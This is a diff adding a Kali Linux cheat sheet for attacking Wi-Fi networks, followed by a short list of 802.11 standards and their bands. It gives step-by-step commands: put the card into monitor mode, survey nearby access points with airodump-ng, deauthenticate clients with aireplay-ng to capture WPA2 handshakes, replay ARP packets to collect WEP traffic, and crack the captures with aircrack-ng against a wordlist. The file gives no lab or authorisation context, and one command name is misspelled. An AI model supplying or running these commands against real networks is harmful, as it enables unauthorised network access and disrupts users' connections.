@@ -1,0 +1,43 @@
+#seperate terminal airodump-ng and monitor mode for broad survey
+sudo airmon-ng check kill
+sudo iw dev
+sudo airmon-ng start wlan0
+sudo iw dev
+sudo airodump-ng --gpsd -W -M -U -a --band abg wlan0mon -w /home/kali/<working folder>/broad
+
+#seperate terminal
+sudo cgps
+
+#seperate terminal airodump-ng targeted survey or replace your broad survey terminal
+#cancel your broad survey to conduct your targeted survey
+sudo airodump-ng --gpsd -W -M -U --bssid <ap> --channel <number> wlan0mon -w /home/kali/<working folder>/target
+
+#seperate terminal aireplay-ng for WPA2
+sudo aireplay-ng -0 1 -a <bssid> -c <client> wlan0mon
+#for 5GHz add the -D option
+sudo airepay-ng -0 1 -a <bssid> -c <client> wlan0mon -D 
+
+#aireplay-ng for WEP - wait for 50,000 packets / send the WPA2 deauth attack in a seperate terminal
+sudo aireplay-ng -3 -b <bssid> -h <client> wlan0mon
+#for 5GHz add the -D option
+sudo aireplay-ng -3 -b <bssid> -h <client> wlan0mon -D
+
+#aircrack the WPA2 handshake
+sudo aircrack-ng <capture packet> -w </usr/share/wordlists/dictionary file>
+
+#aircrack the WEP handshake
+sudo aircrack-ng <capture packet>
+
+#reset network back to normal
+sudo airmon-ng stop wlan0mon
+sudo iw dev
+sudo service NetworkManager restart
+
+#amendments
+B 2.4
+A 5
+G 2.4
+N 2.4 + 5
+AC 5
+AD 60
+AX 2.4 + 5 + 6
